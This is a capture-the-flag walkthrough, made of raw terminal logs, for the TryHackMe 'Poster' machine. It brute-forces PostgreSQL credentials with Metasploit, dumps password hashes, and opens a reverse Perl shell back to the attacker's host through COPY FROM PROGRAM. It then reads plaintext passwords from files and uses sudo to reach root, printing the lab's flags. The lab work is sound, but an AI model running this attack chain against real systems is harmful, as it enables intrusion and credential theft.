# Poster

```bash
┌──(Spadille㉿kali)-[~]
└─$ nmap -sC -sV -v 10.10.156.229
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-20 22:54 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 22:54
Completed NSE at 22:54, 0.00s elapsed
Initiating NSE at 22:54
Completed NSE at 22:54, 0.00s elapsed
Initiating NSE at 22:54
Completed NSE at 22:54, 0.00s elapsed
Initiating Ping Scan at 22:54
Scanning 10.10.156.229 [2 ports]
Completed Ping Scan at 22:54, 0.18s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:54
Completed Parallel DNS resolution of 1 host. at 22:54, 0.03s elapsed
Initiating Connect Scan at 22:54
Scanning 10.10.156.229 [1000 ports]
Discovered open port 22/tcp on 10.10.156.229
Discovered open port 80/tcp on 10.10.156.229
Discovered open port 5432/tcp on 10.10.156.229
Completed Connect Scan at 22:54, 20.28s elapsed (1000 total ports)
Initiating Service scan at 22:54
Scanning 3 services on 10.10.156.229
Completed Service scan at 22:54, 7.05s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.156.229.
Initiating NSE at 22:54
Completed NSE at 22:54, 5.79s elapsed
Initiating NSE at 22:54
Completed NSE at 22:54, 1.18s elapsed
Initiating NSE at 22:54
Completed NSE at 22:54, 0.00s elapsed
Nmap scan report for 10.10.156.229
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb (RSA)
|   256 eb:3a:a3:4e:6f:10:00:ab:ef:fc:c5:2b:0e:db:40:57 (ECDSA)
|_  256 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de (ED25519)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Poster CMS
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.21
| ssl-cert: Subject: commonName=ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-07-29T00:54:25
| Not valid after:  2030-07-27T00:54:25
| MD5:   da57 3213 e9aa 9274 d0be c1b0 bbb2 0b09
|_SHA-1: 4e03 8469 28f7 673b 2bb2 0440 4ba9 e4d2 a0d0 5dd5
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 22:54
Completed NSE at 22:54, 0.00s elapsed
Initiating NSE at 22:54
Completed NSE at 22:54, 0.00s elapsed
Initiating NSE at 22:54
Completed NSE at 22:54, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.17 seconds
```

```bash
┌──(Spadille㉿kali)-[~]
└─$ msfconsole
                                                  
                                              `:oDFo:`                            
                                           ./ymM0dayMmy/.                          
                                        -+dHJ5aGFyZGVyIQ==+-                    
                                    `:sm⏣~~Destroy.No.Data~~s:`                
                                 -+h2~~Maintain.No.Persistence~~h+-              
                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          
                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.      
                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    
                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  
                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:  
                      :we're.all.alike'`                     The.PFYroy.No.D7:  
                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    
                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:    
                      :---srwxrwx:-.`                        `MS146.52.No.Per:    
                      :<script>.Ac816/                        sENbove3101.404:    
                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    
                      :09.14.2011.raid                       /STFU|wall.No.Pr:    
                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    
                      :#OUTHOUSE-  -s:                       /corykennedyData:                                                                                              
                      :$nmap -oS                              SSo.6178306Ence:                                                                                              
                      :Awsm.da:                            /shMTl#beats3o.No.:                                                                                              
                      :Ring0:                             `dDestRoyREXKC3ta/M:                                                                                              
                      :23d:                               sSETEC.ASTRONOMYist:                                                                                              
                       /-                        /yo-    .ence.N:(){ :|: & };:                                                                                              
                                                 `:Shall.We.Play.A.Game?tron/                                                                                               
                                                 ```-ooy.if1ghtf0r+ehUser5`                                                                                                 
                                               ..th3.H1V3.U2VjRFNN.jMh+.`                                                                                                   
                                              `MjM~~WE.ARE.se~~MMjMs                                                                                                        
                                               +~KANSAS.CITY's~-`                                                                                                           
                                                J~HAKCERS~./.`                                                                                                              
                                                .esc:wq!:`                                                                                                                  
                                                 +++ATH`                                                                                                                    
                                                  `                                                                                                                         
                                                                                                                                                                            

       =[ metasploit v6.1.37-dev                          ]
+ -- --=[ 2212 exploits - 1171 auxiliary - 396 post       ]
+ -- --=[ 615 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: You can pivot connections over sessions 
started with the ssh_login modules

msf6 > search postgres

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   auxiliary/server/capture/postgresql                                          normal     No     Authentication Capture: PostgreSQL
   1   post/linux/gather/enum_users_history                                         normal     No     Linux Gather User History
   2   exploit/multi/http/manage_engine_dc_pmp_sqli                2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   3   exploit/windows/misc/manageengine_eventlog_analyzer_rce     2015-07-11       manual     Yes    ManageEngine EventLog Analyzer Remote Code Execution
   4   auxiliary/admin/http/manageengine_pmp_privesc               2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   5   auxiliary/analyze/crack_databases                                            normal     No     Password Cracker: Databases
   6   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   7   exploit/multi/postgres/postgres_createlang                  2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution
   8   auxiliary/scanner/postgres/postgres_dbname_flag_injection                    normal     No     PostgreSQL Database Name Command Line Flag Injection
   9   auxiliary/scanner/postgres/postgres_login                                    normal     No     PostgreSQL Login Utility
   10  auxiliary/admin/postgres/postgres_readfile                                   normal     No     PostgreSQL Server Generic Query
   11  auxiliary/admin/postgres/postgres_sql                                        normal     No     PostgreSQL Server Generic Query
   12  auxiliary/scanner/postgres/postgres_version                                  normal     No     PostgreSQL Version Probe
   13  exploit/linux/postgres/postgres_payload                     2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution
   14  exploit/windows/postgres/postgres_payload                   2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution
   15  auxiliary/scanner/postgres/postgres_hashdump                                 normal     No     Postgres Password Hashdump
   16  auxiliary/scanner/postgres/postgres_schemadump                               normal     No     Postgres Schema Dump
   17  auxiliary/admin/http/rails_devise_pass_reset                2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset

Interact with a module by name or index. For example info 17, use 17 or use auxiliary/admin/http/rails_devise_pass_reset
```

```bash
msf6 > use auxiliary/scanner/postgres/postgres_login
msf6 auxiliary(scanner/postgres/postgres_login) > options

Module options (auxiliary/scanner/postgres/postgres_login):

   Name              Current Setting                                   Required  Description
   ----              ---------------                                   --------  -----------
   BLANK_PASSWORDS   false                                             no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                 yes       How fast to bruteforce, from 0 to 5
   DATABASE          template1                                         yes       The database to authenticate against
   DB_ALL_CREDS      false                                             no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                             no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                             no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                                              no        Skip existing credentials stored in the current database (Accepted: none, user, user&real
                                                                                 m)
   PASSWORD                                                            no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/p  no        File containing passwords, one per line
                     ostgres_default_pass.txt
   Proxies                                                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RETURN_ROWSET     true                                              no        Set to true to see query result sets
   RHOSTS                                                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metaspl
                                                                                 oit
   RPORT             5432                                              yes       The target port
   STOP_ON_SUCCESS   false                                             yes       Stop guessing when a credential works for a host
   THREADS           1                                                 yes       The number of concurrent threads (max one per host)
   USERNAME                                                            no        A specific username to authenticate as
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/p  no        File containing (space-separated) users and passwords, one pair per line
                     ostgres_default_userpass.txt
   USER_AS_PASS      false                                             no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/p  no        File containing users, one per line
                     ostgres_default_user.txt
   VERBOSE           true                                              yes       Whether to print output for all attempts

msf6 auxiliary(scanner/postgres/postgres_login) > set RHOSTS 10.10.156.229
RHOSTS => 10.10.156.229
msf6 auxiliary(scanner/postgres/postgres_login) > exploit

[!] No active DB -- Credential data will not be saved!
[-] 10.10.156.229:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
[-] 10.10.156.229:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.156.229:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.156.229:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
[-] 10.10.156.229:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.156.229:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
[-] 10.10.156.229:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.156.229:5432 - LOGIN FAILED: postgres:postgres@template1 (Incorrect: Invalid username or password)
[+] 10.10.156.229:5432 - Login Successful: postgres:password@template1
[-] 10.10.156.229:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
[-] 10.10.156.229:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.156.229:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.156.229:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
[-] 10.10.156.229:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.156.229:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
[-] 10.10.156.229:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.156.229:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.156.229:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[-] 10.10.156.229:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.156.229:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.156.229:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```bash
msf6 auxiliary(server/capture/postgresql) > use 11
msf6 auxiliary(admin/postgres/postgres_sql) > options

Module options (auxiliary/admin/postgres/postgres_sql):

   Name           Current Setting   Required  Description
   ----           ---------------   --------  -----------
   DATABASE       template1         yes       The database to authenticate against
   PASSWORD       postgres          no        The password for the specified username. Leave blank for a random password.
   RETURN_ROWSET  true              no        Set to true to see query result sets
   RHOSTS                           yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          5432              yes       The target port
   SQL            select version()  no        The SQL query to execute
   USERNAME       postgres          yes       The username to authenticate as
   VERBOSE        false             no        Enable verbose output

msf6 auxiliary(admin/postgres/postgres_sql) > set PASSWORD password
PASSWORD => password
msf6 auxiliary(admin/postgres/postgres_sql) > set RHOSTS 10.10.244.60
RHOSTS => 10.10.244.60
msf6 auxiliary(admin/postgres/postgres_sql) > exploit
[*] Running module against 10.10.244.60

Query Text: 'select version()'
==============================

    version
    -------
    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit

[*] Auxiliary module execution completed
```

```bash
msf6 auxiliary(admin/postgres/postgres_sql) > use 15
msf6 auxiliary(scanner/postgres/postgres_hashdump) > options

Module options (auxiliary/scanner/postgres/postgres_hashdump):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  postgres         yes       The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     5432             yes       The target port
   THREADS   1                yes       The number of concurrent threads (max one per host)
   USERNAME  postgres         yes       The username to authenticate as

msf6 auxiliary(scanner/postgres/postgres_hashdump) > set PASSWORD password
PASSWORD => password
msf6 auxiliary(scanner/postgres/postgres_hashdump) > set RHOSTS 10.10.244.60
RHOSTS => 10.10.244.60
msf6 auxiliary(scanner/postgres/postgres_hashdump) > EXPLOIT
[-] Unknown command: EXPLOIT
msf6 auxiliary(scanner/postgres/postgres_hashdump) > exploit

[+] Query appears to have run successfully
[+] Postgres Server Hashes
======================

 Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```bash
msf6 auxiliary(scanner/postgres/postgres_hashdump) > use 10
msf6 auxiliary(admin/postgres/postgres_readfile) > options

Module options (auxiliary/admin/postgres/postgres_readfile):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  template1        yes       The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RFILE     /etc/passwd      yes       The remote file
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     5432             yes       The target port
   USERNAME  postgres         yes       The username to authenticate as
   VERBOSE   false            no        Enable verbose output
```

```bash
msf6 auxiliary(admin/postgres/postgres_readfile) > use 6
[*] Using configured payload cmd/unix/reverse_perl
msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > options

Module options (exploit/multi/postgres/postgres_copy_from_program_cmd_exec):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   DATABASE           template1        yes       The database to authenticate against
   DUMP_TABLE_OUTPUT  false            no        select payload command output from table (For Debugging)
   PASSWORD           postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT              5432             yes       The target port (TCP)
   TABLENAME          UnLJfTHIN9       yes       A table name that does not exist (To avoid deletion)
   USERNAME           postgres         yes       The username to authenticate as

Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set RHOSTS 10.10.244.60
RHOSTS => 10.10.244.60
msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set PASSWORD password
PASSWORD => password
msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set LHOST 10.18.23.186
LHOST => 10.18.23.186
msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run

[*] Started reverse TCP handler on 10.18.23.186:4444 
[*] 10.10.244.60:5432 - 10.10.244.60:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
[*] 10.10.244.60:5432 - Exploiting...
[+] 10.10.244.60:5432 - 10.10.244.60:5432 - UnLJfTHIN9 dropped successfully
[+] 10.10.244.60:5432 - 10.10.244.60:5432 - UnLJfTHIN9 created successfully
[+] 10.10.244.60:5432 - 10.10.244.60:5432 - UnLJfTHIN9 copied successfully(valid syntax/command)
[+] 10.10.244.60:5432 - 10.10.244.60:5432 - UnLJfTHIN9 dropped successfully(Cleaned)
[*] 10.10.244.60:5432 - Exploit Succeeded

id
uid=109(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
python3 -c "import pty;pty.spawn('/bin/bash')"
[*] Command shell session 2 opened (10.18.23.186:4444 -> 10.10.244.60:60178 ) at 2022-04-21 01:43:45 -0400

postgres@ubuntu:/var/lib/postgresql/9.5/main$ ls
ls
base          pg_logical    pg_snapshots  pg_twophase           postmaster.pid
global        pg_multixact  pg_stat       PG_VERSION
pg_clog       pg_notify     pg_stat_tmp   pg_xlog
pg_commit_ts  pg_replslot   pg_subtrans   postgresql.auto.conf
pg_dynshmem   pg_serial     pg_tblspc     postmaster.opts
postgres@ubuntu:/var/lib/postgresql/9.5/main$ cd home
cd home
bash: cd: home: No such file or directory
postgres@ubuntu:/var/lib/postgresql/9.5/main$ cd /    
cd /
postgres@ubuntu:/$ ls
ls
bin   etc         initrd.img.old  lost+found  opt   run   sys  var
boot  home        lib             media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
postgres@ubuntu:/$ cd home
cd home
postgres@ubuntu:/home$ ls
ls
alison  dark
postgres@ubuntu:/home$ cd alison
cd alison
postgres@ubuntu:/home/alison$ ls
ls
user.txt
postgres@ubuntu:/home/alison$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
postgres@ubuntu:/home/alison$ ls -la
ls -la
total 40
drwxr-xr-x 4 alison alison 4096 Jul 28  2020 .
drwxr-xr-x 4 root   root   4096 Jul 28  2020 ..
-rw------- 1 alison alison 2444 Jul 28  2020 .bash_history
-rw-r--r-- 1 alison alison  220 Jul 28  2020 .bash_logout
-rw-r--r-- 1 alison alison 3771 Jul 28  2020 .bashrc
drwx------ 2 alison alison 4096 Jul 28  2020 .cache
drwxr-xr-x 2 alison alison 4096 Jul 28  2020 .nano
-rw-r--r-- 1 alison alison  655 Jul 28  2020 .profile
-rw-r--r-- 1 alison alison    0 Jul 28  2020 .sudo_as_admin_successful
-rw------- 1 alison alison   35 Jul 28  2020 user.txt
-rw-r--r-- 1 root   root    183 Jul 28  2020 .wget-hsts
postgres@ubuntu:/home/alison$ cd ..
cd ..
postgres@ubuntu:/home$ ls
ls
alison  dark
postgres@ubuntu:/home$ cd dark 
cd dark 
postgres@ubuntu:/home/dark$ ls
ls
credentials.txt
postgres@ubuntu:/home/dark$ cat credentials.txt
cat credentials.txt
dark:qwerty1234#!hackme
postgres@ubuntu:/home/dark$ cd /var/www/html
cd /var/www/html
postgres@ubuntu:/var/www/html$ ls
ls
config.php  poster
postgres@ubuntu:/var/www/html$ cat config.php
cat config.php
<?php 

        $dbhost = "127.0.0.1";
        $dbuname = "alison";
        $dbpass = "p4ssw0rdS3cur3!#";
        $dbname = "mysudopassword";
?>postgres@ubuntu:/var/www/html$ su alison
su alison
Password: mysudopassword

su: Authentication failure
postgres@ubuntu:/var/www/html$ ls
ls
config.php  poster
postgres@ubuntu:/var/www/html$ whoami
whoami
postgres
postgres@ubuntu:/var/www/html$ su alison
su alison
Password: mysudopassword

su: Authentication failure
postgres@ubuntu:/var/www/html$ su alison
su alison
Password: p4ssw0rdS3cur3!#

alison@ubuntu:/var/www/html$ cat /home/alison/user.txt
cat /home/alison/user.txt
THM{postgresql_fa1l_conf1gurat1on}
alison@ubuntu:/var/www/html$ sudo -l
sudo -l
[sudo] password for alison: p4ssw0rdS3cur3!#

Matching Defaults entries for alison on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
alison@ubuntu:/var/www/html$ sudo -s
sudo -s
root@ubuntu:/var/www/html# cd /root
cd /root
root@ubuntu:/root# ls
ls
root.txt
root@ubuntu:/root# cat root.txt
cat root.txt
THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
```
